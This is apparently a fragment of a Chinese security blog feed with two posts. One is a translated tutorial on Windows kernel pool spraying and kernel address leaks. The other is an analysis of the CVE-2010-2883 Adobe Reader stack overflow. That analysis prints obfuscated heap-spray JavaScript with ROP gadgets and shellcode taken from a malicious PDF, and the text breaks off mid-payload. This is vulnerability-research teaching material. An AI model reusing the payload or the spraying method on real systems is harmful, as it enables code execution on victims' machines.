+        <category>Fuzz</category>
+      </categories>
+      <tags>
+        <tag>Fuzz</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Kernel Pool Spraying</title>
+    <url>/Windows-Kernel-Pool-Spraying/</url>
+    <content><![CDATA[<p><a href="https://www.gatewatcher.com/en/news/blog/windows-kernel-pool-spraying">原文链接</a></p>
+<h1 id="1-导语"><a href="#1-导语" class="headerlink" title="1 导语"></a>1 导语</h1><p>当你正尝试去利用一个内核池漏洞时，你将必须处理许多块和池元数据。块头部存在着不少检查，如果你想避免BSOD(蓝屏)，就必须去控制所有东西。池喷是一门使池中的分配可预见的艺术。这意味着你将知道一个块会被分配在哪里，及其周围的块。如果你想泄露一些精确的信息或者覆写特定的数据，这是必须的。本篇文章的意图不是深度阐述池的内部结构，但只有你知道基础知识才能理解池喷机制。如果你需要关于池的内部结构的详尽信息，你应该阅读Tarjei Mandt的文章。基于同样的原因，我们将只讲述x64结构。<strong>所有在本文提及的东西仅仅使用Windows内部结构并且可以应用在Windows7到Windows10的每个版本。</strong></p>
+<span id="more"></span>
+
+<h1 id="2-部分池结构"><a href="#2-部分池结构" class="headerlink" title="2 部分池结构"></a>2 部分池结构</h1><p>这个池对于Windows内核中的每个分配来说是常见的。由于它已经被广泛使用，所以控制它比控制一个简单的堆要困难得多。它管理着所有类型的数据，从最简单的字符串到最大的结构体。即使池跟堆没有太大的不同，池也有自己的分配器和结构。Windows操作系统内核预留两个内存池，一个保留在物理内存(非分页池)，一个可以跟物理内存进行交换(分页池)。注意Windows8引入了NonPagedPoolNx，它基本上是一个开启了DEP的非分页池。内核中有许多种类型的池，但它们的主要结构是相同的。池描述符保留了池的当前状态信息，当前状态信息包含以下5点：</p>
+<ul>
+<li>(A Deferred Free list)一个延迟的释放列表(默认状态下开启)：当列表被填充的时候就会被释放的块列表</li>
+<li>(A ListHeads)一个根据大小排序的可用块的后进先出列表</li>
+<li>(A Lookaside List)一个后备列表：据大小排序的可用块的后进先出列表。跟ListHeads列表十分相似，但会有一些限制。</li>
+<li>关于当前分配的错误信息</li>
+<li>这个后备列表是一个可用块的后进先出小列表，也是根据大小排序。对于小于或等于0x200(512)字节的块，它被当作块的ListHeads的替代品，来提高性能。稍后介绍它的内部原理。</li>
+</ul>
+<p>简单来说，池只是已分配页的一个列表。一个页的大小为0x1000字节，并且分成块。有一些块大于0x1000字节，这些代表了一种我们目前不进行学习的特殊情况。所以我们将专注于那些小于0xFF1字节的块。下面是内核池块的结构：</p>
+<p><img src="https://img.imgdb.cn/item/6066c4d88322e6675cc779f2.png" alt="image"></p>
+<ul>
+<li><p>(PreviousSize)之前的块大小：之前块的大小。块的大小存储为实际大小右移4位(即实际大小/16)</p>
+</li>
+<li><p>(PoolIndex)池索引：一个用于从对应池类型的的池描述符数组中获取池描述符的索引(数组索引)</p>
+</li>
+<li><p>(BlockSize)当前的块大小：当前块的大小。块的大小存储为实际大小右移4位(即实际大小/16)</p>
+</li>
+<li><p>(PoolType)池类型：一个位掩码，包含块的一些细节</p>
+<ul>
+<li>池类型(非分页、分页……)</li>
+<li>分配与否</li>
+<li>(Quota bit)配额位：如果块被用在进程配额的管理上。如果引发此标志，对应的EPROCESS对象(描述进程信息的内核数据结构)的指针将会被存储到ProcessBilled</li>
+</ul>
+<p><img src="https://pic.imgdb.cn/item/60952a90d1a9ae528f5e9d8a.png"></p>
+<ul>
+<li>一些其他的信息</li>
+</ul>
+</li>
+<li><p>(PoolTag)池标签：4个字符用于识别块是否正在被调试</p>
+</li>
+<li><p>(ProcessBilled)进程指针：如果配额位被设置，就是一个指向EPROCESS结构的指针</p>
+</li>
+</ul>
+<h2 id="2-1-内核池中的分配与释放"><a href="#2-1-内核池中的分配与释放" class="headerlink" title="2.1 内核池中的分配与释放"></a>2.1 内核池中的分配与释放</h2><h3 id="2-1-1-分配"><a href="#2-1-1-分配" class="headerlink" title="2.1.1 分配"></a>2.1.1 分配</h3><p>池有三种不同方式分配块</p>
+<p><img src="https://img.imgdb.cn/item/6066c5068322e6675cc7af38.png" alt="image"></p>
+<ol>
+<li>如果准备分配的块小于0x200字节，分配器将首次尝试使用后备列表。它将寻找与请求的大小完全相同的块。如果没有这样的块，分配器将会使用下一种方式</li>
+<li>它将使用列表头，也会寻找与请求的大小完全相同的块。如果没有这样的块，分配器将选择一个更大的块并将其分成两部分；一部分将会被分配，另外一部分被存储在适合的列表头中</li>
+<li>如果任何对应的块都没有，它将会分配一个新页，并且它的一个块被分配在该页的顶部。接下来的每个块都会被分配到该页的底端，第三种分配方法示意图如下：</li>
+</ol>
+<p><img src="https://img.imgdb.cn/item/606817a48322e6675cf4a6e5.png"></p>
+<h3 id="2-1-2-释放"><a href="#2-1-2-释放" class="headerlink" title="2.1.2 释放"></a>2.1.2 释放</h3><p>同时，存在几种机制去释放块</p>
+<p><img src="https://img.imgdb.cn/item/6068236f8322e6675c000c12.png"></p>
+<ol>
+<li>如果块是一个小的块(小于等于0x200字节)，分配器将首先尝试将这个块存储到对应其类型的后备列表中。然而，一个后备列表最多存储0xff(255)个同样大小的数据块，所以它可能已经满了</li>
+<li>如果延迟释放标志出现(默认开启)，这个块将被存储到延迟释放列表，直到这个列表是满的(最大容纳0x20个块)。一旦延迟释放列表满了，这个列表将用于同时释放每个块，进而提高性能</li>
+<li>最后，这个块实际上是可用的；分配器检查其周围的块是否可用，如果是，就将它们合并起来，然后存储这个新块到合适的列表头。如果实际上释放了整个页面，那么它将会被简单释放</li>
+</ol>
+<h1 id="3-池喷射基础"><a href="#3-池喷射基础" class="headerlink" title="3 池喷射基础"></a>3 池喷射基础</h1><p>现在，让我们直奔主题。池喷的基本原理就是分配足够多的对象以确保你可以控制未来的分配。Windows向我们提供了许多允许对象分配在不同类型的池的工具。例如，我们可以在非分页池(NonPagedPoolNx在Windows8及往后的版本)中分配ReservedObjects(对象)或者Semaphores(对象)。找到与要控制的池类型匹配的对象取决于你。你所选择的对象大小也很重要，它与你要创建的空隙大小直接相关。一旦你选择你的对象，首先通过大量分配这个对象来取消池的随机化，创建这样的池页面：</p>
+<p><img src="https://pic.imgdb.cn/item/60952c3ad1a9ae528f6dfb88.png"></p>
+<p>当你分配这些对象时，Windows显然不会提供它们的地址，因为这是一些内核地址，但它会给你一个对象句柄。你可以使用这个句柄通过调用CloseHanle函数去释放对象。大量分配这个对象确保我们耗尽后备列表和列表头。从现在开始，我们所做的每一个分配使用一个新的页面。当我们保留为自己分配的所有对象的句柄列表，我们可以猜想池与句柄列表之间的联系</p>
+<p><img src="https://pic.imgdb.cn/item/60952c76d1a9ae528f701a77.png"></p>
+<p>它允许我们通过相邻的块调用CloseHandle，创建半控制大小的间隙(因为它是对象大小的积)</p>
+<p><img src="https://pic.imgdb.cn/item/60952cadd1a9ae528f723b56.png"></p>
+<p>一些细节仍然存在，并可能会给你带来麻烦：</p>
+<ul>
+<li>如果你选择的对象大小为0x200字节，这是非常有可能的，这会使对应的块在后备列表中释放，避免块的合并。为了避免这种情况，你必须在释放将组成间隙的块之前通过释放足够多的对象来填充后备列表</li>
+<li>然后你释放的块将会进入延迟释放列表，但不会立即合并。因此，你必须释放足够的对象去填充延迟释放列表，在释放即将组成间隙的块之后</li>
+<li>最后，你将会在池中分配，对于整个内核来说它使通用的。这意味着你创建的间隙将会随时被你无法控制的一些东西分配。你得快点</li>
+</ul>
+<p>一个简短的步骤摘要：</p>
+<ol>
+<li>使用选择释放的块的句柄</li>
+<li>释放足够多的块去填充后备列表</li>
+<li>释放选择的块</li>
+<li>释放足够的块去填充延迟释放列表</li>
+<li>尽可能快地使用你的间隙</li>
+</ol>
+<h1 id="4-结合泄露"><a href="#4-结合泄露" class="headerlink" title="4 结合泄露"></a>4 结合泄露</h1><p>我之前提过Windows不会向你提供对象的地址，因为它们是内核地址。然而，我骗了你。</p>
+<p>在Windows上，可以使用函数NtQuerySystemInformation来获取一些总所周知的泄露。这个函数有点魔幻，它允许许多内核地址泄露。我们主要感兴趣的是它提供当前分配的每个对象的列表的能力，通过向我们提供那些结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span><br><span class="line">&#123;</span><br><span class="line">    PVOID Object;</span><br><span class="line">    ULONG_PTR UniqueProcessId;</span><br><span class="line">    HANDLE HandleValue;</span><br><span class="line">    ULONG GrantedAccess;</span><br><span class="line">    USHORT CreatorBackTraceIndex;</span><br><span class="line">    USHORT ObjectTypeIndex;</span><br><span class="line">    ULONG HandleAttributes;</span><br><span class="line">    ULONG Reserved;</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;</span><br><span class="line"></span><br><span class="line">typedef struct _SYSTEM_EXTENDED_HANDLE_INFORMATION</span><br><span class="line">&#123;</span><br><span class="line">    ULONG_PTR NumberOfHandles;</span><br><span class="line">    ULONG_PTR Reserved;</span><br><span class="line">    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];</span><br><span class="line">&#125; SYSTEM_EXTENDED_HANDLE_INFORMATION, *PSYSTEM_EXTENDED_HANDLE_INFORMATION;</span><br></pre></td></tr></table></figure>
+
+<p>使用 SystemExtendedHandleInformation参数来调用NtQuerySystemInformation函数会给我们提供_SYSTEM_EXTENDED_HANDLE_INFORMATION结构。我们可以使用句柄字段去列举每个在系统上已分配的对象。每个对象都被_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX结构描述，其中包括以下信息：</p>
+<ul>
+<li>句柄值字段，它匹配我们分配对象时获得的句柄</li>
+<li>对象字段，它是内核池内存中对象的地址</li>
+<li>通过使用这个列表，我们可以通过句柄获取任何对象的内核地址</li>
+</ul>
+<p>值得注意得是，自Windows8以来，这个泄露在低完整性级别上就不再可用。因此，如果你处于低完整性级别，你得坚持基础喷射。我们可以使用它来提高我们得喷射性能并使它百分百可靠</p>
+<p>我们当前在池中创建间隙得方法不值得信任；即使还要很多可能性，两个对象一个接一个在池内存中是相邻的，这也是不确定的。它们可能被分配到两个不同的页面，或者一个未知的块可能分配到两个块之间，谁知道呢。</p>
+<p>通过这些泄露地址，我们可以轻松确保我们创建的间隙是有效的：</p>
+<ul>
+<li>选择我们列表里的一个句柄，并泄露它的内核地址</li>
+<li>使用上面选择的句柄的下一个句柄并泄露它的内核地址，它应该等于上一个内核地址加上块的大小。如果不相等，这些块就不是一个紧挨着一个的，间隙就不是有效的</li>
+<li>检查构成间隙的每个块，也检查间隙周围的每一块</li>
+</ul>
+<p><img src="https://pic.imgdb.cn/item/6066c4858322e6675cc72387.png"></p>
+<p>使用这种方法，我们百分百确定我们的间隙是有效的</p>
+<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p>现在，池喷是如此的强大以至于没有使用它去利用内核池的一个漏洞似乎是不可能的。然而，池喷任然存在一些限制。首先，我们不能创建任意大小的间隙，因为它总是取决于所选择的池喷对象的大小。当然，我们可以想象一个喷射混合了几种对象为了创建更多不同大小的间隙，但迄今为止，我们从来不需要使用这种方法。尽管它完全可能，因为地址泄露总是允许我们确保我们的间隙的有效性。其次，预测一个大小&lt;=0x200字节的块的分配是很复杂的，因为这个分配器会使用后备列表。实现这一点的唯一办法就是使用一个与要控制的块的大小完全相同的对象。我编写了一个库，它使用了这里解释的方法，并提供了一个简易的API去池喷</p>
+<p>Windows是时候完全修复NtQuerySystemInformation泄露(虽然它在低IL上不再可用)，因为在我看来，这是唯一的办法去减轻对内核池的每一次攻击</p>
+<p>在那之前，享受的你的内核池派对</p>
+<h1 id="6-参考资料"><a href="#6-参考资料" class="headerlink" title="6 参考资料"></a>6 参考资料</h1><ol>
+<li><p><a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf</a></p>
+</li>
+<li><p><a href="http://illmatics.com/Windows%208%20Heap%20Internals.pdf">http://illmatics.com/Windows%208%20Heap%20Internals.pdf</a></p>
+</li>
+<li><p><a href="http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html">http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html</a></p>
+</li>
+<li><p><a href="https://github.com/fishstiqz/poolinfo">https://github.com/fishstiqz/poolinfo</a></p>
+</li>
+<li><p><a href="https://github.com/cbayet/PoolSprayer">https://github.com/cbayet/PoolSprayer</a></p>
+<p>研究和文章作者: BAYET Corentin</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
+      <tags>
+        <tag>Vuln</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2010-2883分析</title>
+    <url>/CVE-2010-2883%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<blockquote>
+<p>用到的实验文件<a href="https://github.com/ReJimp/lab-environment/blob/master/AdbeRdr930_zh_CN.exe">https://github.com/ReJimp/lab-environment/blob/master/AdbeRdr930_zh_CN.exe</a></p>
+</blockquote>
+<h1 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1 漏洞描述"></a>1 漏洞描述</h1><p>CVE-2010-2883是Adobe Reader和Acrobat的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开特制的PDF文件就可能导致执行任意代码</p>
+<span id="more"></span>
+
+<h1 id="2-调试环境"><a href="#2-调试环境" class="headerlink" title="2 调试环境"></a>2 调试环境</h1><ul>
+<li>操作系统——Windows XP SP3</li>
+<li>虚拟机——VMware Pro 16</li>
+<li>反汇编器——IDA Pro 6.8</li>
+<li>动态调试器——52OllyDbg</li>
+<li>漏洞软件——Adobe Reader 9.3.4</li>
+<li>JS提取工具——PdfStreamDumper</li>
+</ul>
+<h1 id="3-定位漏洞"><a href="#3-定位漏洞" class="headerlink" title="3 定位漏洞"></a>3 定位漏洞</h1><p>使用IDA的加载器加载CoolType.dll文件，按住shift+F12打开字符串窗口，ctrl+F搜索字符串可以发现”SING”字体</p>
+<img src="https://img.imgdb.cn/item/604669855aedab222c2c2290.png" style="zoom:150%;" />
+
+<p>点击此项跳转到反汇编视图，左键单击选中字符数组，按住X查看到多处交叉引用</p>
+<p><img src="https://img.imgdb.cn/item/60466ab65aedab222c2c7e8f.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:0819DB4C ; char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015A91+D2o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DBF2+7Bo ...</span><br><span class="line">.rdata:0819DB51                 align 4</span><br></pre></td></tr></table></figure>
+
+<p>点击第二处的交叉引用进去即可发现存在栈溢出漏洞的地方，主要是strcat函数造成的栈溢出漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0803DBF2 var_160         = byte ptr -160h</span><br><span class="line">.text:0803DBF2 var_140         = dword ptr -140h</span><br><span class="line">.text:0803DBF2 var_138         = dword ptr -138h</span><br><span class="line">.text:0803DBF2 var_134         = dword ptr -134h</span><br><span class="line">.text:0803DBF2 var_130         = dword ptr -130h</span><br><span class="line">.text:0803DBF2 var_12C         = dword ptr -12Ch</span><br><span class="line">.text:0803DBF2 var_128         = dword ptr -128h</span><br><span class="line">.text:0803DBF2 var_124         = dword ptr -124h</span><br><span class="line">.text:0803DBF2 var_120         = dword ptr -120h</span><br><span class="line">.text:0803DBF2 var_119         = byte ptr -119h</span><br><span class="line">.text:0803DBF2 var_114         = dword ptr -114h</span><br><span class="line">.text:0803DBF2 var_10C         = dword ptr -10Ch</span><br><span class="line">.text:0803DBF2 var_108         = byte ptr -108h</span><br><span class="line">.text:0803DBF2 var_4           = dword ptr -4</span><br><span class="line">.text:0803DBF2 arg_0           = dword ptr  8</span><br><span class="line">.text:0803DBF2 arg_4           = dword ptr  0Ch</span><br><span class="line">.text:0803DBF2 arg_8           = dword ptr  10h</span><br><span class="line">.text:0803DBF2 arg_C           = dword ptr  14h</span><br><span class="line">.text:0803DBF2</span><br><span class="line">.text:0803DBF2                 push    ebp</span><br><span class="line">.text:0803DBF3                 sub     esp, 104h              分配栈空间为0x104字节</span><br><span class="line">.text:0803DBF9                 lea     ebp, [esp-4]</span><br><span class="line">.text:0803DBFD                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DC02                 xor     eax, ebp</span><br><span class="line">.text:0803DC04                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DC0A                 push    4Ch</span><br><span class="line">.text:0803DC0C                 mov     eax, offset sub_81847C4</span><br><span class="line">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DC2E                 call    sub_8041626</span><br><span class="line">.text:0803DC33                 xor     esi, esi</span><br><span class="line">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DC5B                 push    edi             ; int</span><br><span class="line">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DC63                 call    sub_802178F</span><br><span class="line">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class="line">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;		</span><br><span class="line">.text:0803DC72                 push    edi             ; int</span><br><span class="line">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] 指向SING表入口</span><br><span class="line">.text:0803DC76                 call    sub_8021ABE             处理SING表</span><br><span class="line">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DC7E                 cmp     eax, esi	               判断是否为空</span><br><span class="line">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DC84                 jz      short loc_803DCBD</span><br><span class="line">.text:0803DC86                 mov     ecx, [eax]              字体资源版本号，这里为1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DC8E                 jz      short loc_803DC98       这里跳转</span><br><span class="line">.text:0803DC90                 cmp     ecx, 100h</span><br><span class="line">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class="line">.text:0803DC98</span><br><span class="line">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9Cj</span><br><span class="line">.text:0803DC98                 add     eax, 10h                 相对sing表入口偏移0x10处找到uniqueName</span><br><span class="line">.text:0803DC9B                 push    eax             ; char * uniqueName域</span><br><span class="line">.text:0803DC9C                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DC9F                 push    eax             ; char * 目的地址是一段固定大小的栈空间</span><br><span class="line">.text:0803DCA0                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DCA4                 call    strcat                   发生栈溢出</span><br></pre></td></tr></table></figure>
+
+<p>现在我们来查看一下导致栈溢出的strcat函数原型</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function">C 库函数 <span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span> 把 src 所指向的字符串追加到 dest 所指向的字符串的结尾   </span></span><br></pre></td></tr></table></figure>
+
+<p>由以上可得，调用strcat函数时，没有对uniqueName字段的字符串长度进行检测，直接将其追加到固定长度的[ebp+108h+var_108]尾处，若uniqueName的字符串长度加上[ebp+108h+var_108]本身的字符串长度大于[ebp+108h+var_108]的固定长度，则发生栈溢出，恶意攻击者可以插入精心构造的shellcode进而执行恶意代码</p>
+<h2 id="3-1-危险函数总结"><a href="#3-1-危险函数总结" class="headerlink" title="3.1 危险函数总结"></a>3.1 危险函数总结</h2><p>第一类函数：<code>scanf</code>、<code>gets</code>等输入读取函数，建议使用<code>scanf_s</code>安全函数进行替代</p>
+<p>第二类函数：<code>strcpy</code>、<code>strcat</code>、<code>sprintf</code>等字符串拷贝函数，建议使用<code>strncpy</code>、<code>strncat</code>、<code>snprintf</code>安全函数进行替代</p>
+<h1 id="4-样本分析"><a href="#4-样本分析" class="headerlink" title="4 样本分析"></a>4 样本分析</h1><p>使用PdfStreamDumper(<a href="http://sandsprite.com/CodeStuff/PDFStreamDumper_Setup.exe">http://sandsprite.com/CodeStuff/PDFStreamDumper_Setup.exe</a>)加载样本文件(名企面试自助手册.pdf)，点击Search_for选项的TTF Fonts</p>
+<p><img src="https://img.imgdb.cn/item/60475a7a5aedab222c94785f.png"></p>
+<p>紧接着在Objects窗口选中目标Object，单击右键，选择”Save Decompressed Stream”即可将TTF文件保存至本地</p>
+<img src="https://img.imgdb.cn/item/60475e415aedab222c962bf7.png"  />
+
+<h2 id="4-1-TTF文件结构"><a href="#4-1-TTF文件结构" class="headerlink" title="4.1 TTF文件结构"></a>4.1 TTF文件结构</h2><p>TrueType字体通常包含在单个TrueType字体文件中，其文件后缀为.TTF。除此之外OpenType字体是以类似于TrueType字体的格式编码的POSTSCRIPT字体，OPENTYPE字体使用.OTF文件后缀。OPENTYPE还允许把多个OPENTYPE字体组合在一个文件中以利于数据共享。这些字体被称为TrueType字体集（TrueType  Collection），其文件后缀为.TTC</p>
+<p>TrueType字体用machintosh的轮廓字体资源的格式编码，有一个唯一的标记名”sfnt”。Windows没有macintosh的位图字体资源格式，字体目录包含了字体格式的版本号和几个表，每个表都有一个TableEntry结构项，TableEntry结构包含了资源标记、校验和、偏移量和每个表的大小</p>
+<p>TTF字体目录定义：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Fixed   sfntversion;</span><br><span class="line">    USHORT  numTables;</span><br><span class="line">    USHORT  searchRange;</span><br><span class="line">    USHORT  entrySelector;</span><br><span class="line">    USHORT  rangeShift;</span><br><span class="line">    TableEntry  entries[numTables];</span><br><span class="line">&#125; TableDirectory;</span><br></pre></td></tr></table></figure>
+
+<p>字体目录单个表的TableEntry定义：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> sturct</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>    tag[<span class="number">4</span>];</span><br><span class="line">    ULONG   checkSum;</span><br><span class="line">    ULONG   offset;</span><br><span class="line">    ULONG   length;</span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>
+
+<img src="https://img.imgdb.cn/item/606165bd8322e6675c9a343c.png" style="zoom:150%;" />
+
+<p>根据以上定义，我们将其与”SING”字体入口的十六进制数据进行对号入座，得到标记为：SING，校验和为：0xD9BCC8B5，相对文件的偏移量为0x0000011C，数据长度为0x00001DDF，也许你会疑惑，是不是数据项的数值错了？其实，是你错了呦，因为TrueType字体中的所有数据都使用big-endian(大尾)编码，最高位字节在最前面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">53 49 4E 47	--tag</span><br><span class="line">D9 BC C8 B5	--checkSum</span><br><span class="line">00 00 01 1C	--offset</span><br><span class="line">00 00 1D DF	--length</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-uniqueName域"><a href="#4-2-uniqueName域" class="headerlink" title="4.2 uniqueName域"></a>4.2 uniqueName域</h2><p>根据相对文件偏移0x11C定位到SING字体的真正位置</p>
+<p><img src="https://img.imgdb.cn/item/6047676e5aedab222c9dc1ae.png"></p>
+<p>根据之前的反汇编代码，再偏移0x10即可找到uniqueName域</p>
+<p><img src="https://img.imgdb.cn/item/604767fc5aedab222c9e7f2f.png"></p>
+<p>执行strcat后，会将”58 E0 8D AD”起始的部分复制到[ebp+108h+var_108]，直到遇见NULL字符串终止符才停止复制</p>
+<h2 id="4-3-动态调试验证"><a href="#4-3-动态调试验证" class="headerlink" title="4.3 动态调试验证"></a>4.3 动态调试验证</h2><p>使用OD加载AcroRd32.exe(Adobe Reader 9.3.4版本)，按下F9运行，才能加载CoolType.dll文件</p>
+<p><img src="https://img.imgdb.cn/item/60476f295aedab222ca7cfe5.png"></p>
+<p>使用ctrl+G跳转到0x0803DC6D处，按F2下断点，再使用Adobe Reader打开样本文件，此时程序暂停运行</p>
+<p><img src="https://img.imgdb.cn/item/6047717e5aedab222ca9eba6.png"></p>
+<p>执行到<code>call strcat</code>前可以看到strcat将会把0x06BE1D60的内容复制到0x0012E4D8(EBP)</p>
+<p><img src="https://img.imgdb.cn/item/6063e7598322e6675c0811f3.png"></p>
+<p>执行完后strcat后，0x0012E4D8后的内容发生改变，返回地址已经被替换成攻击者精心构造的地址</p>
+<p><img src="https://img.imgdb.cn/item/6063e86f8322e6675c097013.png"></p>
+<p>反汇编中跟随0x4A82A714，可以找到<strong>第一个ROP指令</strong></p>
+<p><img src="https://img.imgdb.cn/item/6063e9238322e6675c0a2c26.png"></p>
+<p>此时的栈顶为0x0C0C0C0C，通过嵌入到PDF的Javascript实现Heap Spary，进而跳入shellcode执行代码。0x0C0C0C0C是绕过DEP的关键部分，利用ROP实现</p>
+<p><img src="https://img.imgdb.cn/item/6063ea708322e6675c0bf745.png"></p>
+<p>通过PDFStreamDumper提取的原始JS堆喷射代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var nXzaRHPbywqAbGpGxOtozGkvQWhu;</span><br><span class="line">for(i=0;i&lt;28002;i++) // ahjf;ak&#x27;</span><br><span class="line">nXzaRHPbywqAbGpGxOtozGkvQWhu+=0x78;//ahflajf</span><br><span class="line">var WjOZZFaiSj = unescape;</span><br><span class="line">var nXzaRHPbywqAbGpGxOtozGkvQWhu = WjOZZFaiSj( &quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot;+</span><br><span class="line">&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot; +</span><br><span class="line">&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot; +</span><br><span class="line">&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot; +</span><br><span class="line">&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot; +</span><br><span class="line">&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot; +</span><br><span class="line">&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot; +</span><br><span class="line">&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot; +</span><br><span class="line">&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot; +</span><br><span class="line">&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot; +</span><br><span class="line">&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot; +</span><br><span 